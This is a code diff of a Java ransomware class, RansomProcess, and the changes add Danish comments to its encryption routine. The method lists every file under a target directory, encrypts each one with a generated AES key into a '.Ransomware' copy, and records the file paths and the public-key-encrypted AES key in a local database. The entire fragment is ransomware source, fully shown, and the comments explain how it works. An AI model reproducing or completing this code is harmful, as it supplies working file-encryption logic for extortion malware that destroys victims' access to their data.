@@ -26,18 +26,24 @@ public class RansomProcess {
 
 
     public void StartEncryptProcess(String pubkey) {
+        // læg alle filer i "PathtoFind" sti ind i hashmaps, der mapper fra filsti til extension
         final TreeMap<String, HashMap<String, String>> containsFilters = new SearchDirectory(this.PathtoFind).GetFileMap();
         final Set set = containsFilters.entrySet();
+
+        // iterator til iterering over mængde af (key,value) par i hashmap
+        // key,value = sti, filsti -> fil extension map
         final Iterator iterator = set.iterator();
         SecretKeySpec aesKey = null;
 
         try {
+            // opret aes keyspec til senere kryptering
             aesKey = CryptoRansomware.GenKey();
             while (iterator.hasNext()) {
                 final Map.Entry mentry = (Map.Entry) iterator.next();
 
                 //   System.out.print("key is: " + mentry.getKey() + " & Value is: " + mentry.getValue());
 
+                // Map = filsti -> extension
                 final Object obj = mentry.getValue();
                 final ObjectMapper oMapper = new ObjectMapper();
                 final HashMap<String, String> Map = oMapper.convertValue(obj, HashMap.class);
@@ -48,14 +54,23 @@ public class RansomProcess {
 
                 while (mapiterator.hasNext()) {
 
+                    // entry = filsti, fil extension map
                     Map.Entry entry = (Map.Entry) mapiterator.next();
+
+                    // opret fil objekt til læsning af fil, der skal krypteres
                     final File filein = new File(entry.getKey() + "." + entry.getValue());
+
+                    // opret fil ojekt til skrivning af krypteret data
                     final File fileout = new File(entry.getKey() + ".Ransomware");
 
+                    // krypter fil
                     CryptoRansomware.EncryptFile(filein, fileout, aesKey);
                 }
 
             }
+
+            // indsæt i database: alle hashmaps indeholdende informationer om krypterede stier, filstier, og filernes originale extension
+            // indsæt også den krypterede public key
             EmbeddedDatabase.InsertRecordIntoTable(containsFilters, CryptoRansomware.RetrieveEncryptedAesKey(pubkey, aesKey));
         //hvis der opstå en fejl som er en af dem som er lavet en catch på så stopper den koden og skriver fejlen ud
         } catch (NoSuchAlgorithmException e) {
